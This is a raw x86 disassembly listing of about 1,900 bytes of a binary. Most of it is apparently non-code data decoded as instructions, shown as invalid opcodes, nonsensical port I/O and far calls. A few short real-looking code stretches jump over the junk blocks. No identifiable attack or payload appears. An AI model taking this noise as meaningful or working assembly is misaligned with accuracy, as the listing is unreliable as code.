  40dd46:	hlt    
  40dd47:	jge    0x40dcda
  40dd49:	or     edx,DWORD PTR [edx+eax*1+0xdb7786b]
  40dd50:	int    0x37
  40dd52:	adc    dh,BYTE PTR [ecx]
  40dd54:	push   edx
  40dd55:	sbb    bl,BYTE PTR [edi+eiz*8]
  40dd58:	and    dh,ah
  40dd5a:	cmp    BYTE PTR gs:[eax],ch
  40dd5d:	outs   dx,BYTE PTR ds:[esi]
  40dd5e:	xor    eax,DWORD PTR es:[ebx+0x5c8f9417]
  40dd65:	dec    edi
  40dd66:	clc    
  40dd67:	mov    ebx,0xc4a9415b
  40dd6c:	lea    ebp,[eax]
  40dd6e:	jno    0x40ddc3
  40dd70:	sbb    cl,cl
  40dd72:	out    dx,eax
  40dd73:	mov    ecx,0x8cc0e7c0
  40dd78:	aas    
  40dd79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd7a:	xor    al,0xde
  40dd7c:	pop    eax
  40dd7d:	pop    ebp
  40dd7e:	mov    WORD PTR ds:0x97147142,ds
  40dd84:	imul   ecx,esi,0x72
  40dd87:	sbb    eax,esi
  40dd89:	fs popa 
  40dd8b:	(bad)  
  40dd8c:	adc    eax,0x33a59847
  40dd91:	pop    eax
  40dd92:	call   0x736:0xfde84b40
  40dd99:	sbb    al,BYTE PTR [edi+0x53]
  40dd9c:	or     edi,DWORD PTR [eax+0x5e5e95ab]
  40dda2:	push   cs
  40dda3:	adc    BYTE PTR [ebx+0x57],bh
  40dda6:	sub    eax,0xa512d181
  40ddab:	out    0x85,al
  40ddad:	inc    esi
  40ddae:	and    BYTE PTR [edi-0x4e],ah
  40ddb1:	test   DWORD PTR [ecx+0x53f90c4f],ebp
  40ddb7:	repz dec DWORD PTR [edi+0x3c]
  40ddbb:	or     DWORD PTR [esi+0x30f749df],ebx
  40ddc1:	xchg   edx,eax
  40ddc2:	lods   eax,DWORD PTR cs:[esi]
  40ddc4:	mov    ebx,0xae9457ae
  40ddc9:	mov    cl,0xe4
  40ddcb:	in     eax,0x3a
  40ddcd:	dec    eax
  40ddce:	sar    eax,0x31
  40ddd1:	inc    eax
  40ddd2:	test   DWORD PTR [ebp-0x28],esi
  40ddd5:	jl     0x40de31
  40ddd7:	cwde   
  40ddd8:	dec    ebx
  40ddd9:	and    al,BYTE PTR [ecx]
  40dddb:	jl     0x40de1a
  40dddd:	dec    ebp
  40ddde:	cmp    eax,DWORD PTR [eax+0x861d08e]
  40dde4:	in     al,0xa8
  40dde6:	xchg   BYTE PTR es:[eax+eiz*1-0xb6d639a],bh
  40ddee:	int3   
  40ddef:	xchg   edi,eax
  40ddf0:	adc    edx,ebx
  40ddf2:	fld    QWORD PTR [ecx-0x10]
  40ddf5:	and    al,0x79
  40ddf7:	dec    edi
  40ddf8:	mov    dl,0xb8
  40ddfa:	or     cl,BYTE PTR [edi-0xe]
  40ddfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddfe:	jae    0x40dd91
  40de00:	rcr    DWORD PTR [eax],0x41
  40de03:	ror    DWORD PTR [ecx+0x73020497],1
  40de09:	mov    edi,0x2ed85f2b
  40de0e:	arpl   WORD PTR [edx-0x38135f1f],si
  40de14:	out    dx,al
  40de15:	sub    al,0xea
  40de17:	ja     0x40de42
  40de19:	xor    al,0x26
  40de1b:	add    BYTE PTR [esi+0x65],dl
  40de1e:	adc    BYTE PTR [edx-0x5d],bl
  40de21:	arpl   WORD PTR [edi-0x4e36d66d],cx
  40de27:	enter  0x782a,0xdb
  40de2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de2c:	(bad)  
  40de2d:	das    
  40de2e:	(bad)  
  40de30:	adc    ch,BYTE PTR [ebp-0x32867e1e]
  40de36:	scas   eax,DWORD PTR es:[edi]
  40de37:	repnz ins BYTE PTR es:[edi],dx
  40de39:	shl    DWORD PTR [ebp-0x6e13a46b],0xae
  40de40:	ja     0x40de23
  40de42:	clc    
  40de43:	jge    0x40de8d
  40de45:	out    0x9,eax
  40de47:	sub    ecx,DWORD PTR [esi]
  40de49:	les    ebp,FWORD PTR [ecx-0x15e76cd]
  40de4f:	mov    ah,0xd6
  40de51:	sbb    al,0x8
  40de53:	sub    eax,0x647da997
  40de58:	push   esp
  40de59:	scas   al,BYTE PTR es:[edi]
  40de5a:	mov    bl,0x9b
  40de5c:	pop    ds
  40de5d:	ficomp WORD PTR [ecx+0x1e]
  40de60:	ins    BYTE PTR es:[edi],dx
  40de61:	pop    ebp
  40de62:	cmp    DWORD PTR [edi],ebx
  40de64:	xchg   BYTE PTR [eax-0xd7753c8],bh
  40de6a:	std    
  40de6b:	or     al,0xad
  40de6d:	inc    ecx
  40de6e:	dec    ebp
  40de6f:	mov    ebp,ss
  40de71:	ret    0x3f09
  40de74:	pushf  
  40de75:	fimul  DWORD PTR [edx*1-0x5a3934d7]
  40de7c:	mov    cl,0x60
  40de7e:	push   ds
  40de7f:	sbb    esp,ebp
  40de81:	test   eax,0x3dc4a90c
  40de86:	add    eax,0xc095d04
  40de8b:	nop
  40de8c:	retf   
  40de8d:	jmp    0xc2ea:0x7055e9ab
  40de94:	in     eax,0x43
  40de96:	sub    al,0x20
  40de98:	sub    eax,0x78e162ea
  40de9d:	je     0x40deda
  40de9f:	jns    0x40df1b
  40dea1:	mov    esi,0x3c9c7072
  40dea6:	adc    al,0x31
  40dea8:	(bad)  
  40dea9:	sahf   
  40deaa:	xchg   esi,eax
  40deab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40deac:	mov    ah,BYTE PTR [edi-0x272ac666]
  40deb2:	xor    eax,0xb658e948
  40deb7:	xor    BYTE PTR [esi+0x3db5d6c8],bl
  40debd:	push   esi
  40debe:	das    
  40debf:	pop    DWORD PTR [ebx+0x4a]
  40dec2:	out    dx,eax
  40dec3:	mov    ch,0xa8
  40dec5:	inc    esp
  40dec6:	in     eax,dx
  40dec7:	call   0x393ddd54
  40decc:	add    al,0x8e
  40dece:	push   0x72
  40ded0:	mov    dl,0xdb
  40ded2:	jb     0x40dee7
  40ded4:	sbb    BYTE PTR [ecx-0x29528bb],al
  40deda:	mov    esp,0xbde773a6
  40dedf:	out    dx,eax
  40dee0:	and    ax,0x1984
  40dee4:	sbb    edi,DWORD PTR [edi]
  40dee6:	sbb    ah,BYTE PTR [ebx-0x7a619dfa]
  40deec:	inc    ebx
  40deed:	sti    
  40deee:	dec    eax
  40deef:	popf   
  40def0:	cld    
  40def1:	daa    
  40def2:	arpl   WORD PTR [ebp+0x94b188a],bx
  40def8:	sub    esi,ebx
  40defa:	mov    WORD PTR [esi],es
  40defc:	or     eax,0x5e70a950
  40df01:	push   ecx
  40df02:	jmp    0x40df6b
  40df04:	xor    esp,DWORD PTR [ecx]
  40df06:	in     al,dx
  40df07:	xor    BYTE PTR [edi],bl
  40df09:	pop    es
  40df0a:	pop    ebx
  40df0b:	ins    DWORD PTR es:[edi],dx
  40df0c:	adc    DWORD PTR [ecx+0x54e14c7e],esi
  40df12:	jae    0x40df0f
  40df14:	inc    edx
  40df15:	mov    bh,BYTE PTR [ecx+0xc8e1ae]
  40df1b:	add    DWORD PTR [ebp+0x72],0x81d1c7e8
  40df22:	sbb    al,0x8c
  40df24:	mov    edi,0x321c5682
  40df29:	js     0x40defc
  40df2b:	lahf   
  40df2c:	lahf   
  40df2d:	add    edi,DWORD PTR [edi+0x33]
  40df30:	push   ebx
  40df31:	pop    ebx
  40df32:	inc    esp
  40df33:	mov    ebx,0x4fb70c98
  40df38:	pop    edx
  40df39:	loopne 0x40df85
  40df3b:	mov    ecx,0x419ca2ef
  40df40:	xor    eax,0xed5539a4
  40df45:	aam    0xa5
  40df47:	enter  0x30b9,0x19
  40df4b:	stc    
  40df4c:	out    0x1f,eax
  40df4e:	xchg   BYTE PTR [eax-0x6159b3aa],bh
  40df54:	clc    
  40df55:	jle    0x40df32
  40df57:	jae    0x40df5d
  40df59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df5a:	pop    ebx
  40df5b:	xor    BYTE PTR [ecx+eax*8-0x4d],bl
  40df5f:	aaa    
  40df60:	sub    eax,0x8f9a4b78
  40df65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df66:	sbb    eax,DWORD PTR [esp+ebx*2]
  40df69:	xchg   esi,eax
  40df6a:	sbb    eax,0xebbf4068
  40df6f:	dec    edx
  40df70:	cld    
  40df71:	scas   al,BYTE PTR es:[edi]
  40df72:	lods   al,BYTE PTR ds:[esi]
  40df73:	cmp    ebp,DWORD PTR [edi]
  40df75:	push   ebp
  40df76:	test   al,0xf2
  40df79:	mov    WORD PTR [ebp+0x6d7a4916],gs
  40df7f:	add    DWORD PTR [ecx+edi*2],esi
  40df82:	scas   al,BYTE PTR es:[edi]
  40df83:	inc    edi
  40df84:	sbb    al,0x55
  40df86:	pop    eax
  40df87:	mov    ?,ebp
  40df89:	shl    BYTE PTR [ecx+0x32],cl
  40df8c:	jg     0x40df2a
  40df8e:	cwde   
  40df8f:	out    0xc9,eax
  40df91:	jle    0x40df4a
  40df93:	mov    esi,0x2a3f0e63
  40df98:	xchg   esi,eax
  40df99:	cli    
  40df9a:	push   edi
  40df9b:	imul   edi,edx,0xffffffee
  40df9e:	les    esp,FWORD PTR [edx-0x79bd5df2]
  40dfa4:	add    BYTE PTR [ebx],al
  40dfa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfa7:	add    cl,BYTE PTR [ebx-0x55]
  40dfaa:	or     al,0xd1
  40dfac:	sbb    ch,dh
  40dfae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfaf:	dec    ecx
  40dfb0:	ret    
  40dfb1:	and    edx,DWORD PTR [ebx+0x129c02f9]
  40dfb7:	loope  0x40dfb4
  40dfb9:	jbe    0x40dff6
  40dfbb:	adc    al,0x72
  40dfbd:	sbb    al,0xb9
  40dfbf:	mov    ds:0x6d422602,al
  40dfc4:	(bad)  
  40dfc6:	push   esi
  40dfc7:	xor    ecx,ecx
  40dfc9:	shl    BYTE PTR [esp+ebp*8+0x52e0ac5a],1
  40dfd0:	(bad)  
  40dfd1:	fnstcw WORD PTR [ecx-0x34cd7bc7]
  40dfd7:	pop    ebx
  40dfd8:	inc    eax
  40dfd9:	sub    bh,cl
  40dfdb:	jns    0x40e03c
  40dfdd:	sub    BYTE PTR [edx+0x628ee51b],bh
  40dfe3:	pop    ds
  40dfe4:	mov    bl,0x62
  40dfe6:	sub    al,0xa0
  40dfe8:	pop    esi
  40dfe9:	sub    al,0x1f
  40dfeb:	cli    
  40dfec:	(bad)  
  40dfee:	xor    DWORD PTR es:[edx],eax
  40dff1:	rcl    DWORD PTR [ebx],cl
  40dff3:	mov    bh,0xe8
  40dff5:	fcomi  st,st(6)
  40dff7:	loop   0x40df9e
  40dff9:	fldcw  WORD PTR cs:[edx+0x48]
  40dffd:	data16 aam 0xb3
  40e000:	xlat   BYTE PTR ds:[ebx]
  40e001:	(bad)  
  40e002:	(bad)  [ebx]
  40e004:	mov    bl,0xa9
  40e006:	xchg   ebx,eax
  40e007:	nop
  40e008:	jl     0x40dfb6
  40e00a:	call   0x71e45f84
  40e00f:	inc    ebx
  40e010:	pop    es
  40e011:	clc    
  40e012:	sub    cl,BYTE PTR ds:0xfe75a280
  40e018:	dec    edi
  40e019:	mov    edi,0x873bd329
  40e01e:	ret    0x9198
  40e021:	push   0x60bd672e
  40e026:	pop    ebp
  40e027:	aas    
  40e028:	dec    esi
  40e029:	ret    0x206
  40e02c:	jae    0x40e00d
  40e02e:	push   edx
  40e02f:	scas   eax,DWORD PTR es:[edi]
  40e030:	push   eax
  40e031:	sub    DWORD PTR [edx-0x2c3be460],0x637e6f79
  40e03b:	jmp    0x35fa:0xeb36140b
  40e042:	inc    ecx
  40e043:	fadd   DWORD PTR [edi]
  40e045:	sbb    dl,BYTE PTR [edx-0xee1b42c]
  40e04b:	outs   dx,BYTE PTR ds:[esi]
  40e04c:	popf   
  40e04d:	and    ecx,esi
  40e04f:	xor    edi,edi
  40e051:	add    ecx,ebx
  40e053:	mov    DWORD PTR [ebp-0x20],ecx
  40e056:	mov    eax,ds:0x434396
  40e05b:	mov    eax,DWORD PTR [ebp-0x20]
  40e05e:	jmp    0x40e452
  40e063:	xlat   BYTE PTR ds:[ebx]
  40e064:	frstor [esi-0xeac49ad]
  40e06a:	pop    ecx
  40e06b:	test   DWORD PTR [ecx],0x6a75baa7
  40e071:	sbb    DWORD PTR [eax+0x707092f9],ebp
  40e077:	dec    ecx
  40e078:	jge    0x40e0ea
  40e07a:	jo     0x40e0b3
  40e07c:	pusha  
  40e07d:	mov    al,ds:0x6acb36ff
  40e082:	ja     0x40e08d
  40e084:	int3   
  40e085:	jns    0x40e040
  40e087:	sub    al,0x59
  40e089:	xor    dh,BYTE PTR [eax+ebp*1+0x2f]
  40e08d:	mov    ch,0x37
  40e08f:	or     eax,0x5ebcedae
  40e094:	cmc    
  40e095:	stos   DWORD PTR es:[edi],eax
  40e096:	inc    ebx
  40e097:	mov    eax,ds:0x2305c655
  40e09c:	stos   BYTE PTR es:[edi],al
  40e09d:	mov    ebx,DWORD PTR [ebx-0x4cf2dcff]
  40e0a3:	jp     0x40e0cb
  40e0a5:	add    al,0x8c
  40e0a7:	push   ecx
  40e0a8:	in     al,0x16
  40e0aa:	adc    eax,ebx
  40e0ac:	push   ss
  40e0ad:	pop    eax
  40e0ae:	fcmovnb st,st(2)
  40e0b0:	xchg   ecx,eax
  40e0b1:	jle    0x40e131
  40e0b3:	xor    al,0xe0
  40e0b5:	retf   
  40e0b6:	fcomp  QWORD PTR [esi+0x1d]
  40e0ba:	ins    BYTE PTR es:[edi],dx
  40e0bb:	icebp  
  40e0bc:	popa   
  40e0bd:	stc    
  40e0be:	(bad)  
  40e0bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0c0:	push   eax
  40e0c1:	ins    BYTE PTR es:[edi],dx
  40e0c2:	les    edi,FWORD PTR [esi+0x176f7e7c]
  40e0c8:	aad    0xa4
  40e0ca:	jbe    0x40e114
  40e0cc:	les    edx,FWORD PTR [esi]
  40e0ce:	imul   esp,DWORD PTR [ecx-0x7],0x59556103
  40e0d5:	loop   0x40e0d5
  40e0d7:	pop    ebx
  40e0d8:	out    0xa9,al
  40e0da:	xor    dh,bl
  40e0dc:	push   0xffffffdd
  40e0de:	das    
  40e0df:	jae    0x40e13b
  40e0e1:	es jle 0x40e0a9
  40e0e4:	adc    al,0xec
  40e0e6:	pop    esi
  40e0e7:	scas   eax,DWORD PTR es:[edi]
  40e0e8:	pop    ebp
  40e0e9:	(bad)  
  40e0ea:	hlt    
  40e0eb:	fimul  WORD PTR [ebp+0x238cb0ba]
  40e0f1:	add    al,0x7c
  40e0f3:	aas    
  40e0f4:	adc    eax,0xd557286c
  40e0f9:	push   esp
  40e0fa:	sub    eax,ecx
  40e0fc:	les    ecx,FWORD PTR [ebp-0x51885c8e]
  40e102:	and    eax,0xf9e76fc7
  40e107:	adc    DWORD PTR [eax+0x7e],0xffffffdf
  40e10b:	inc    edi
  40e10c:	and    DWORD PTR [esi+0x7],ecx
  40e10f:	mov    eax,ds:0x37863cb5
  40e114:	dec    edi
  40e115:	and    esp,edx
  40e117:	jbe    0x40e0c1
  40e119:	test   ecx,esp
  40e11b:	cwde   
  40e11c:	lods   eax,DWORD PTR ds:[esi]
  40e11d:	loope  0x40e12d
  40e11f:	mov    edi,0x903243c8
  40e124:	xchg   DWORD PTR [edx-0x322f666c],esp
  40e12a:	data16 cmc 
  40e12c:	ror    BYTE PTR [eax-0x5b03bfb9],1
  40e132:	and    DWORD PTR ds:0x11f897c5,0xfffffff0
  40e139:	fdivrp st(0),st
  40e13b:	lahf   
  40e13c:	pushf  
  40e13d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e13e:	add    DWORD PTR [edi],eax
  40e140:	and    ebp,DWORD PTR [esi+eax*4-0x75ab7673]
  40e147:	rol    BYTE PTR [eax-0x5d811dfa],cl
  40e14d:	ror    BYTE PTR [edx-0xd76851b],0xfd
  40e154:	jl     0x40e16c
  40e156:	jne    0x40e143
  40e158:	ret    0x215c
  40e15b:	scas   eax,DWORD PTR es:[edi]
  40e15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e15d:	and    BYTE PTR [edx-0x539df6f8],bl
  40e163:	mov    al,ds:0x1db37633
  40e168:	push   0x67
  40e16a:	mov    dh,0xb5
  40e16c:	fcomp  QWORD PTR [edi+0x65]
  40e16f:	outs   dx,BYTE PTR ds:[esi]
  40e170:	push   0xc8df7e29
  40e175:	es loopne 0x40e10d
  40e178:	int3   
  40e179:	and    dh,ch
  40e17b:	test   dl,ah
  40e17d:	jg     0x40e17d
  40e17f:	sbb    DWORD PTR [edx+0x33fa6b8d],esp
  40e185:	ficomp WORD PTR [esi-0x15]
  40e188:	mov    edi,DWORD PTR [esi]
  40e18a:	mov    bl,BYTE PTR [eax+0x7f0fb8ef]
  40e190:	jmp    0x40e16d
  40e192:	pop    edx
  40e193:	dec    BYTE PTR [ecx+ebp*8-0x38ed32fd]
  40e19a:	test   eax,0x90f6761e
  40e19f:	lods   al,BYTE PTR ss:[esi]
  40e1a1:	add    edi,esi
  40e1a3:	stos   DWORD PTR es:[edi],eax
  40e1a4:	or     DWORD PTR [edi],ebp
  40e1a6:	in     eax,dx
  40e1a7:	adc    eax,0xba86432c
  40e1ac:	xchg   DWORD PTR [ecx-0x3f],ebp
  40e1af:	mov    esp,0xd0619d3f
  40e1b4:	mov    ch,0xdb
  40e1b6:	sahf   
  40e1b7:	and    dh,BYTE PTR [esi]
  40e1b9:	sbb    bh,dl
  40e1bb:	das    
  40e1bc:	std    
  40e1bd:	dec    ebp
  40e1be:	lods   eax,DWORD PTR ds:[esi]
  40e1bf:	das    
  40e1c0:	ja     0x40e154
  40e1c2:	fnstcw WORD PTR [esi]
  40e1c4:	mov    ch,0x94
  40e1c6:	xchg   edi,eax
  40e1c7:	dec    ecx
  40e1c8:	shl    DWORD PTR [ecx-0x2f91772a],0x22
  40e1cf:	pop    esp
  40e1d0:	in     eax,dx
  40e1d1:	xchg   BYTE PTR [ebx-0x1d],al
  40e1d4:	adc    DWORD PTR [esi+0x6b6dab79],edi
  40e1da:	sbb    BYTE PTR [ecx-0x4a],cl
  40e1dd:	adc    BYTE PTR [ecx-0x62],cl
  40e1e0:	pop    esp
  40e1e1:	fs js  0x40e216
  40e1e4:	ds sbb eax,0x4f645189
  40e1ea:	adc    eax,0x2d8c562b
  40e1ef:	cwde   
  40e1f0:	into   
  40e1f1:	imul   esi,DWORD PTR [ebx+0x6d],0x2acd96b1
  40e1f8:	lods   al,BYTE PTR ds:[esi]
  40e1f9:	push   DWORD PTR [ebx+0x2944d9a5]
  40e1ff:	lods   al,BYTE PTR ds:[esi]
  40e200:	jle    0x40e1a8
  40e202:	sub    eax,0x5c22c6aa
  40e207:	inc    esi
  40e208:	pop    ss
  40e209:	test   al,0xc
  40e20b:	mov    eax,ds:0x29a5c451
  40e210:	int3   
  40e211:	push   esi
  40e212:	mov    ebp,0xedcfffd2
  40e217:	xchg   edx,eax
  40e218:	stos   BYTE PTR es:[edi],al
  40e219:	pop    edx
  40e21a:	(bad)  
  40e21b:	out    dx,al
  40e21c:	adc    al,0x7c
  40e21e:	adc    edx,DWORD PTR [ebp+0xa397f71]
  40e224:	in     eax,0x44
  40e226:	mov    bl,0x83
  40e228:	jbe    0x40e210
  40e22a:	push   ss
  40e22b:	cmp    bh,al
  40e22d:	mov    WORD PTR [ebx],cs
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	mov    bh,0xb2
  40e232:	sub    al,0xf9
  40e234:	sbb    al,0xa9
  40e236:	dec    ebx
  40e237:	cdq    
  40e238:	scas   al,BYTE PTR es:[edi]
  40e239:	daa    
  40e23a:	ficom  WORD PTR [edi-0x4a]
  40e23d:	pop    esi
  40e23e:	mov    esi,0x66c5ea95
  40e243:	cmp    al,0xc1
  40e245:	inc    ecx
  40e246:	addr16 pop ebp
  40e248:	scas   eax,DWORD PTR es:[edi]
  40e249:	pop    ebp
  40e24a:	js     0x40e297
  40e24c:	dec    ecx
  40e24d:	loopne 0x40e213
  40e24f:	(bad)  
  40e251:	sbb    cl,al
  40e253:	pop    ebp
  40e254:	in     eax,dx
  40e255:	sahf   
  40e256:	repz cmp BYTE PTR [esi+0x6cff6df9],ch
  40e25d:	nop
  40e25e:	clc    
  40e25f:	in     eax,0x11
  40e261:	push   ebp
  40e262:	fidiv  DWORD PTR [ecx-0x41cc4e0a]
  40e268:	out    dx,eax
  40e269:	and    ebp,ecx
  40e26b:	xor    ecx,ebp
  40e26d:	mov    cl,0x7e
  40e26f:	ret    0x39c7
  40e272:	cdq    
  40e273:	dec    ebp
  40e274:	ret    0x511b
  40e277:	jmp    0x40e258
  40e279:	and    dh,dh
  40e27b:	cmp    esi,eax
  40e27d:	out    dx,al
  40e27e:	and    eax,0x2ace1907
  40e283:	ins    DWORD PTR es:[edi],dx
  40e284:	dec    esp
  40e285:	or     cl,al
  40e287:	(bad)  
  40e288:	adc    eax,0xbd58dba3
  40e28d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e28e:	pop    edx
  40e28f:	bound  edx,QWORD PTR [esi]
  40e291:	jae    0x40e24a
  40e293:	or     bh,ah
  40e295:	retf   0xa210
  40e298:	mov    bh,0x27
  40e29a:	xor    eax,edi
  40e29c:	pop    ds
  40e29d:	or     bh,BYTE PTR [esi+eiz*8]
  40e2a0:	mov    al,0xef
  40e2a2:	jb     0x40e2d9
  40e2a4:	sub    dl,dh
  40e2a6:	sub    DWORD PTR [edx+0x37b05c7b],ebp
  40e2ac:	pop    ebx
  40e2ad:	cmp    bl,dl
  40e2af:	sbb    al,0xe
  40e2b1:	dec    esi
  40e2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2b3:	mov    BYTE PTR [ecx+0x56],bh
  40e2b6:	adc    eax,0x67994380
  40e2bb:	mov    ebp,0xdecbdf75
  40e2c0:	pop    ds
  40e2c1:	xchg   edi,eax
  40e2c2:	lods   al,BYTE PTR ds:[esi]
  40e2c3:	lods   al,BYTE PTR ds:[esi]
  40e2c4:	mov    al,0x6
  40e2c6:	pushf  
  40e2c7:	aad    0xd0
  40e2c9:	push   ds
  40e2ca:	lahf   
  40e2cb:	xchg   edx,eax
  40e2cc:	loopne 0x40e26f
  40e2ce:	cmovno ebx,DWORD PTR [esi+eax*2+0x2a1a1814]
  40e2d6:	out    0x4d,al
  40e2d8:	out    dx,al
  40e2d9:	iret   
  40e2da:	dec    esi
  40e2db:	rcl    BYTE PTR [edx],1
  40e2dd:	(bad)  
  40e2de:	test   ebx,0xb09455d4
  40e2e4:	repnz mov ebx,edx
  40e2e7:	add    eax,0x46c62e01
  40e2ec:	int3   
  40e2ed:	dec    esp
  40e2ee:	(bad)  
  40e2ef:	fst    st(0)
  40e2f1:	mov    ebp,0x2a760341
  40e2f6:	pop    esi
  40e2f7:	imul   esi,DWORD PTR [edx],0xe3549d0a
  40e2fd:	push   eax
  40e2fe:	ss ins DWORD PTR es:[edi],dx
  40e300:	xor    bl,BYTE PTR ds:0xf476ad3c
  40e306:	mov    ah,0x7b
  40e308:	je     0x40e290
  40e30a:	mov    DWORD PTR [ebp+0x7e],ebx
  40e30d:	(bad)  
  40e30e:	mov    ?,ecx
  40e310:	xchg   esi,eax
  40e311:	mov    ebp,0x7785d7bd
  40e316:	repz or BYTE PTR [esi+0x716c0357],ch
  40e31d:	xor    bh,BYTE PTR [esi-0x69]
  40e320:	out    0x5f,eax
  40e322:	mov    BYTE PTR [edx+0xafe8b75],ch
  40e328:	cli    
  40e329:	xchg   BYTE PTR [edx],al
  40e32b:	int3   
  40e32c:	mov    ch,0x2a
  40e32e:	ret    0xa116
  40e331:	bound  esi,QWORD PTR [esi+0x4d4df648]
  40e337:	lods   al,BYTE PTR ds:[esi]
  40e338:	not    DWORD PTR [ecx+0x64]
  40e33b:	xchg   esp,eax
  40e33c:	pop    esp
  40e33d:	mov    al,ds:0x4763b886
  40e342:	hlt    
  40e343:	call   0xc95:0xed8928b0
  40e34a:	xchg   edx,eax
  40e34b:	mov    DWORD PTR [edx],esi
  40e34d:	jmp    FWORD PTR [edi-0x7d]
  40e350:	mov    edx,0x933c9ac5
  40e355:	pop    edx
  40e356:	imul   sp,bx,0xeac6
  40e35b:	pop    ecx
  40e35c:	fwait
  40e35d:	sbb    DWORD PTR [ebx-0x6e],0xffffffe2
  40e361:	mov    ds:0x9c106a63,al
  40e366:	adc    BYTE PTR [edi],dh
  40e368:	cmp    BYTE PTR [ebx],dl
  40e36a:	arpl   WORD PTR [eax+0x8],bp
  40e36d:	mov    ds:0x8421825d,eax
  40e372:	xor    dl,cl
  40e374:	sub    BYTE PTR [ecx+ebp*4-0x70],bl
  40e378:	aad    0x7d
  40e37a:	pop    esp
  40e37b:	mov    edi,0x54662f88
  40e380:	out    dx,eax
  40e381:	retf   0x640b
  40e384:	sbb    BYTE PTR [edx+0x4a857958],bh
  40e38a:	lods   eax,DWORD PTR ds:[esi]
  40e38b:	mov    ?,WORD PTR [eax-0x4a]
  40e38e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e38f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e390:	js     0x40e350
  40e392:	or     al,0xbc
  40e394:	cmp    al,0x1d
  40e396:	(bad)  
  40e397:	push   edi
  40e398:	test   DWORD PTR [ecx+0x58],esi
  40e39b:	rcl    BYTE PTR [edx+0x6ed09d2c],0x6e
  40e3a2:	inc    ebp
  40e3a3:	sub    ebx,esi
  40e3a5:	push   cs
  40e3a6:	lock and ah,0xe2
  40e3aa:	int    0xaf
  40e3ac:	dec    ebp
  40e3ad:	loopne 0x40e3b8
  40e3af:	in     eax,dx
  40e3b0:	xor    BYTE PTR [eax-0x57],ah
  40e3b3:	and    eax,0xa712c4d2
  40e3b8:	dec    ecx
  40e3b9:	jnp    0x40e38b
  40e3bb:	enter  0x1006,0x6
  40e3bf:	sar    DWORD PTR [ecx-0x66d6e8e6],0xe3
  40e3c6:	popa   
  40e3c7:	mov    ah,BYTE PTR [esi]
  40e3c9:	xchg   esp,eax
  40e3ca:	leave  
  40e3cb:	lods   eax,DWORD PTR ds:[esi]
  40e3cc:	cdq    
  40e3cd:	ss inc edx
  40e3cf:	cwde   
  40e3d0:	ficomp WORD PTR [edi+0x7a36f623]
  40e3d6:	sbb    al,0xe2
  40e3d8:	xchg   ebx,edx
  40e3da:	mov    dh,0x18
  40e3dc:	cmc    
  40e3dd:	xchg   ebp,eax
  40e3de:	outs   dx,BYTE PTR ds:[esi]
  40e3df:	xor    ebx,DWORD PTR [edi+edx*2-0x6952a939]
  40e3e6:	fstp   QWORD PTR [edx-0x6aacabcc]
  40e3ec:	shl    eax,1
  40e3ee:	mov    ds:0xa76c8943,eax
  40e3f3:	jnp    0x40e418
  40e3f5:	sub    DWORD PTR [edi+0x36],0x464ae131
  40e3fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3fd:	mov    dl,BYTE PTR [edi]
  40e3ff:	pop    es
  40e400:	and    eax,0xde2e3109
  40e405:	mov    edx,0xe82cdcf9
  40e40a:	dec    eax
  40e40b:	jl     0x40e417
  40e40d:	popf   
  40e40e:	nop
  40e40f:	or     al,0x1f
  40e411:	(bad)  
  40e412:	push   ebx
  40e413:	or     DWORD PTR [ecx-0x1d],ebp
  40e416:	fnstcw WORD PTR [ebp+0x778ad498]
  40e41c:	loopne 0x40e3ed
  40e41e:	inc    edi
  40e41f:	mov    eax,0x2f91bbd0
  40e424:	cmpxchg DWORD PTR ds:0xc5a5d40b,ecx
  40e42b:	cwde   
  40e42c:	pushf  
  40e42d:	jl     0x40e479
  40e42f:	das    
  40e430:	push   ds
  40e431:	jo     0x40e3ec
  40e433:	xor    BYTE PTR [esi+0x5a],dh
  40e436:	repz call 0xf3e32bd7
  40e43c:	inc    esi
  40e43d:	cmp    DWORD PTR [ebx],0xffffffbb
  40e440:	test   eax,0x4dddea7
  40e445:	ins    BYTE PTR es:[edi],dx
  40e446:	mov    esp,0xe471722d
  40e44b:	or     DWORD PTR [edx+edi*4-0x54b354b4],ebp
  40e452:	je     0x40fd56
  40e458:	movzx  eax,BYTE PTR ds:0x434382
  40e45f:	add    DWORD PTR ds:0x43441d,eax
  40e465:	mov    eax,DWORD PTR [ebp-0x4]
  40e468:	or     DWORD PTR ds:0x432dda,0x4326f0
  40e472:	xor    eax,0x7510855
  40e477:	add    eax,ebx
  40e479:	mov    DWORD PTR ds:0x432dc2,0x11db
  40e483:	cmp    edi,eax
  40e485:	jne    0x40f511
  40e48b:	push   DWORD PTR [ebp+0x8]
  40e48e:	adc    DWORD PTR ds:0x434392,0x8a5
  40e498:	call   0x40bc0c
  40e49d:	mov    DWORD PTR [ebp-0x20],eax
  40e4a0:	add    eax,0x438
  40e4a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e4a8:	jmp    0x40e89c
  40e4ad:	fs pop ss
  40e4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4b0:	sbb    BYTE PTR [ecx-0x4a],dh
  40e4b3:	popa   
  40e4b4:	push   ebx
  40e4b5:	neg    BYTE PTR [ecx+edx*1+0x19]
  40e4b9:	mov    ah,0x8
  40e4bb:	inc    ebx
  40e4bc:	(bad)  
  40e4be:	sahf   
  40e4bf:	jo     0x40e531
  40e4c1:	dec    ecx
  40e4c2:	jge    0x40e534
  40e4c4:	jo     0x40e4c7
